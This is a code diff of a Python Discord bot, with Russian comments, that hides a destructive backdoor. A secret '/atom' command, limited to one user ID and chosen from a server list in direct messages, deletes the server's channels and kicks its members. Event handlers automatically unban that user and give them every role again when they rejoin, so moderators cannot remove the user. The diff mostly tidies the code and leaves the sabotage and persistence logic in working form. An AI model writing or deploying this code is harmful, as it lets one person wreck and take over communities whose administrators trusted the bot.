@@ -2,29 +2,25 @@ import discord
 from discord.ext import commands
 import asyncio
 
-TOKEN = 'token'  # Ваш токен бота
-AUTHORIZED_USER_ID = id  # Ваш ID пользователя
+TOKEN = 'your_token_here'  # Ваш токен бота
+AUTHORIZED_USER_ID = your_user_id_here  # Ваш ID пользователя
 
 intents = discord.Intents.default()
 intents.members = True
-intents.guilds = True
 intents.message_content = True
 intents.bans = True
 
 bot = commands.Bot(command_prefix='/', intents=intents)
 
-
 @bot.event
 async def on_ready():
     print(f'Вошел как {bot.user}')
-
 
 async def send_dm(user, message):
     try:
         await user.send(message)
     except discord.Forbidden:
         print(f'Не удалось отправить ЛС пользователю {user.name}. Возможно, у них отключены ЛС.')
-
 
 async def create_invite(guild):
     # Создать ссылку для приглашения
@@ -36,7 +32,6 @@ async def create_invite(guild):
         invite = await guild.text_channels[0].create_invite(max_age=300)
         return invite.url
 
-
 @bot.command()
 async def atom(ctx):
     if ctx.author.id != AUTHORIZED_USER_ID:
@@ -47,9 +42,8 @@ async def atom(ctx):
         # Обработка команды в ЛС
         await handle_dm_atom(ctx)
     else:
-        # Прямое выполнение команды на сервере
-        await handle_server_atom(ctx)
-
+        # Игнорировать команду на сервере
+        await ctx.send("Команда `/atom` может быть выполнена только в личных сообщениях.")
 
 async def handle_dm_atom(ctx):
     guilds = bot.guilds
@@ -79,8 +73,7 @@ async def handle_dm_atom(ctx):
     index = emoji_list.index(reaction.emoji)
     selected_guild = guilds[index]
 
-    confirm_msg = await ctx.send(
-        f"Вы выбрали сервер **{selected_guild.name}**. Подтвердите выполнение команды:\n✔️ - Подтверждаю\n❌ - Отмена")
+    confirm_msg = await ctx.send(f"Вы выбрали сервер **{selected_guild.name}**. Подтвердите выполнение команды:\n✔️ - Подтверждаю\n❌ - Отмена")
     await confirm_msg.add_reaction('✔️')
     await confirm_msg.add_reaction('❌')
 
@@ -100,12 +93,6 @@ async def handle_dm_atom(ctx):
     else:
         await ctx.send("Команда отменена.")
 
-
-async def handle_server_atom(ctx):
-    # Выполнение команды на сервере
-    await perform_atom(ctx.guild)
-
-
 async def perform_atom(guild):
     # Удаление всех текстовых и голосовых каналов
     for channel in guild.channels:
@@ -123,7 +110,6 @@ async def perform_atom(guild):
         except Exception as e:
             print(f'Не удалось выгнать пользователя {member.name}: {e}')
 
-
 @bot.event
 async def on_member_join(member):
     if member.id == AUTHORIZED_USER_ID:
@@ -133,7 +119,6 @@ async def on_member_join(member):
         await member.edit(roles=roles)
         await send_dm(member, f'Вы вернулись на сервер! Вам были выданы все роли.')
 
-
 @bot.event
 async def on_member_ban(guild, user):
     if user.id == AUTHORIZED_USER_ID:
@@ -142,7 +127,6 @@ async def on_member_ban(guild, user):
         await guild.unban(user)  # Немедленно разбанить пользователя
         await send_dm(user, f'Вы были разбанены и вернулись на сервер!')
 
-
 def generate_emojis(count):
     # Генерация эмодзи в зависимости от количества серверов
     emojis = []
@@ -150,8 +134,7 @@ def generate_emojis(count):
         if i <= 10:
             emojis.append(f'{i}️⃣')
         else:
-            emojis.append(f'🔟{i - 10}')  # Используем дополнительные символы для чисел больше 10
+            emojis.append(f'🔟{i-10}')  # Используем дополнительные символы для чисел больше 10
     return emojis
-
 
 bot.run(TOKEN)
